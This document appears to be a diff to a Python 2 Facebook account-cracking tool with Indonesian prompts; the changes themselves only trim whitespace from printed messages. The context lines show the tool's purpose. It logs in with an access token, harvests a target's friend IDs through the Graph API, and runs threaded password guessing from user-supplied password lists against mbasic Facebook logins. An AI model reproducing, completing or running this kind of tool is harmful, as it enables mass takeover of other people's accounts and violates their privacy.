@@ -132,7 +132,7 @@ def gen():
 		print("   [!] Error : %s"%e);gen()
                 logs()
 def log_token():
-	data = raw_input("   [•] Token :")
+	data = raw_input("[•] Token :")
 	try:
 		me = requests.get('https://graph.facebook.com/me?access_token='+data)
 		a = json.loads(me.text)
@@ -207,7 +207,7 @@ def menu():
   print("\033[0;97m[2] Crack")
   print("\033[0;97m[0] Logout")
   print("\033[0;92m───────────────────────────────────────────────")
-  r=raw_input("\033[0;97m   [•] Input : ")
+  r=raw_input("\033[0;97m[•] Input : ")
   if r=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);menu()
   elif r=="1":
     publik()
@@ -226,7 +226,7 @@ def publik():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print("   [•] Cookie Invalid").format(R,N)
+		print("[•] Cookie Invalid").format(R,N)
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		gen()
@@ -241,8 +241,8 @@ def publik():
 			op = json.loads(jok.text)
 			print("\033[0;97m[•] Name           : "+op["name"])
 		except KeyError:
-			print("   [!] ID NOT found !").format("R")
-			print("   [!] Kembali").format(N)
+			print("[!] ID NOT found !").format("R")
+			print("[!] Kembali").format(N)
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
 		id = []
@@ -266,7 +266,7 @@ def publik():
 		menu()
 		
 	except Exception as e:
-		exit("   [•] Error : %s"%e)
+		exit("[•] Error : %s"%e)
 def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
@@ -428,7 +428,7 @@ def methode():
   elif sek=="4":
     crack3()
   else:
-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
+    print("\033[0;97m[!] Isi Yang Benar").format(R,N);methode()
 def logs():
   banner()
   print("\033[0;92m───────────────────────────────────────────────")
@@ -436,7 +436,7 @@ def logs():
   print("\033[0;97m[1] Login With Token")
   print("\033[0;97m[0] Exit")
   print("\033[0;92m───────────────────────────────────────────────")
-  sek=raw_input("\033[0;97m   [•] Input : ")
+  sek=raw_input("\033[0;97m[•] Input : ")
   if sek=="":
     print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
   elif sek=="1":
@@ -446,7 +446,7 @@ def logs():
   elif sek=="3":
     exit()
   else:
-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
+    print("\033[0;97m[!] Isi Yang Benar").format(R,N);logs()
 class crack:
         os.system("clear")
         banner()
@@ -520,7 +520,7 @@ class crack:
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("   [•] Finished")
+			print("[•] Finished")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
@@ -605,7 +605,7 @@ class crack1:
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("   [•] Finished")
+				print("[•] Finished")
 				break
 	def pwlist(self):
 		self.pw=raw_input("\033[0;92m╚══\033[0;97m[•] Password List : ").split(",")
@@ -706,7 +706,7 @@ class crack2:
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("   [•] Finished")
+				print("[•] Finished")
 				break
 	def pwlist(self):
 		self.pw=raw_input("\033[0;92m╚══\033[0;97m[•] Password List : ").split(",")
